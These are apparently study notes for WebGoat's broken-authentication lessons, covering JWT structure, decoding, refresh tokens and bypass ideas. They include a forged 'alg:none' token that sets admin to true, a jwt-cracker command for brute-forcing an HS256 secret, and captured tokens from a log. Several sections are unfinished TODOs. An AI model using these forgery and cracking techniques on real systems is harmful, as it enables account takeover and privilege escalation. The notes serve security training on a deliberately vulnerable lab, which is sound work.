<!-- START doctoc generated TOC please keep comment here to allow auto update -->
<!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
**Table of Contents**  *generated with [DocToc](https://github.com/thlorenz/doctoc)*

- [A2 - Broken Authentication](#a2---broken-authentication)
  - [Authentication Bypass](#authentication-bypass)
  - [JWT tokens](#jwt-tokens)

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

# A2 - Broken Authentication

## Authentication Bypass

### 1. Authentication Bypasses

- Hidden inputs
- Removing Parameters
- Forced Browsing

### 2. 2FA Password Reset

TODO

## JWT tokens

### 1. Concept

### 2. Structure of a JWT token

structure: `header.claims.signature`

### 3. Authentication and getting a JWT token

|Browser||Server|
|-|-|-|
|| --- 1. POST /users/login with username and password ---&gt; ||
||| 2. create a JWT with a secret |
|| &lt;--- 3. returns the JWT to the Browser --- ||
|| --- 4. sends the JWT on the Authorization Header ---&gt; ||
||| 5. check JWT signature. Get user information from the JWT |
|| &lt;--- sends response to the client --- ||

### 4. JWT signing

JWT token: `eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE2MTE4NjY3OTEsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiSmVycnkifQ.Xk8SK-rQYytVU7fQmYSEv8e1e2hnMrR4ljjNIylpNjzKNMx-oZ1Zt35NzmlFXaR5Qkj0YeT25ZFbGiR84UcWAQ`

```sh
$ echo -n eyJhbGciOiJIUzUxMiJ9 | base64 -d
{"alg":"HS512"}

$ echo -n eyJpYXQiOjE2MTE4NjY3OTEsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiSmVycnkifQ== | base64 -d
{"iat":1611866791,"admin":"false","user":"Jerry"}
```

```sh
$ echo -n '{"alg":"none"}' | base64
eyJhbGciOiJub25lIn0=

$ echo -n '{"iat":1611866791,"admin":"true","user":"Jerry"}' | base64
eyJpYXQiOjE2MTE4NjY3OTEsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJKZXJyeSJ9
```

Exploit:

JWT token: `eyJhbGciOiJub25lIn0.eyJpYXQiOjE2MTE4NjY3OTEsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJKZXJyeSJ9.`

### 5. JWT cracking

JWT token: `eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTYxMTAwMTQ1NiwiZXhwIjoxNjExMDAxNTE2LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.3ngFGIX-epPtQFF53n8nNmO2DWZR05pEeb0wqSeKgvk`

```sh
# npm install --global jwt-cracker
$ time jwt-cracker "eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTYxMTAwMTQ1NiwiZXhwIjoxNjExMDAxNTE2LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.3ngFGIX-epPtQFF53n8nNmO2DWZR05pEeb0wqSeKgvk"
```

TODO jwt-cracker output

$ echo -n eyJhbGciOiJIUzI1NiJ9 | base64 -d
{"alg":"HS256"}

$ echo -n eyJpc3MiOieyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTYxMTAwMTQ1NiwiZXhwIjoxNjExMDAxNTE2LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19 | base64 -d
{"iss":"WebGoat Token Builder","aud":"webgoat.org","iat":1611001456,"exp":1611001516,"sub":"tom@webgoat.org","username":"Tom","Email":"tom@webgoat.org","Role":["Manager","Project Administrator"]}


{"iss":"WebGoat Token Builder","aud":"webgoat.org","iat":1611001456,"exp":1611001516,"sub":"tom@webgoat.org","username":"WebGoat","Email":"tom@webgoat.org","Role":["Manager","Project Administrator"]}

### 6. Refreshing a token

```sh
$ curl -X POST -H -d 'username=webgoat&password=webgoat' localhost:8080/WebGoat/login

{
    "token_type":"bearer",
    "access_token":"XXXX.YYYY.ZZZZ",
    "expires_in":10,
    "refresh_token":"4a9a0b1eac1a34201b3c5659944e8b7"
}
```

The best place to use a JWT token is between server to server communications. 
In a normal web application you are better of using plain old cookies.

### 7. Refreshing a token

Logfile content:

```
194.201.170.15 - - [28/Jan/2016:21:28:01 +0100] "GET /JWT/refresh/checkout?token=eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q HTTP/1.1" 401 242 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" "-"
194.201.170.15 - - [28/Jan/2016:21:28:01 +0100] "POST /JWT/refresh/moveToCheckout HTTP/1.1" 200 12783 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" "-"
194.201.170.15 - - [28/Jan/2016:21:28:01 +0100] "POST /JWT/refresh/login HTTP/1.1" 200 212 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" "-"
194.201.170.15 - - [28/Jan/2016:21:28:01 +0100] "GET /JWT/refresh/addItems HTTP/1.1" 404 249 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" "-"
195.206.170.15 - - [28/Jan/2016:21:28:01 +0100] "POST /JWT/refresh/moveToCheckout HTTP/1.1" 404 215 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36" "-"
```

```
POST http://localhost:8080/WebGoat/JWT/refresh/login HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 46
Origin: https://localhost:8080
Connection: keep-alive
Referer: https://localhost:8080/WebGoat/start.mvc
Cookie: JSESSIONID=VkTTDokwF6mHqAv-2-6ME1FcB7iBOc3DaxJRIhy9
Host: localhost:8080

{"user":"Jerry","password":"bm5nhSkxCXZkKRy4"}
```

```
HTTP/1.1 200 OK
Connection: keep-alive
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Type: application/json
Date: Mon, 18 Jan 2021 21:55:06 GMT

{
  "access_token" : "eyJhbGciOiJIUzUxMiJ9.eyJhZG1pbiI6ImZhbHNlIiwidXNlciI6IkplcnJ5In0.Z-ZX2L0Tuub0LEyj9NmyVADu7tK40gL9h1EJeRg1DDa6z5_H-SrexH1MYHoIxRyApnOP7NfFonP3rOw1Y5qi0A",
  "refresh_token" : "wdlkIZVfyAFuscUUKsmV"
}
```

TODO find the way to use refresh_token (Jerry) in order to refresh logfile token (Tom)